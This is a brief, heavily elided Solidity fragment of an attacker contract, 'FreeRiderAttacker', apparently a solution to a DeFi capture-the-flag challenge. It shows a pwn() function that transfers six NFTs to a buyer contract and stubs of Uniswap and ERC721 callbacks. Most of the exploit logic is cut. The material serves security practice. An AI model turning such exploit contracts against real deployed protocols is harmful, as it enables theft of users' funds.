...
contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    ...
    bytes datas = abi.encode(address(this));
    ...
    function pwn() external {
        ...
        for (uint8 tokenId = 0; tokenId < 6; tokenId++) {
            nft.safeTransferFrom(address(this), freeRiderBuyer, tokenId, datas);
        }
    ...
    function onERC721Received(address, address, uint256, bytes memory) external view override returns (bytes4) {
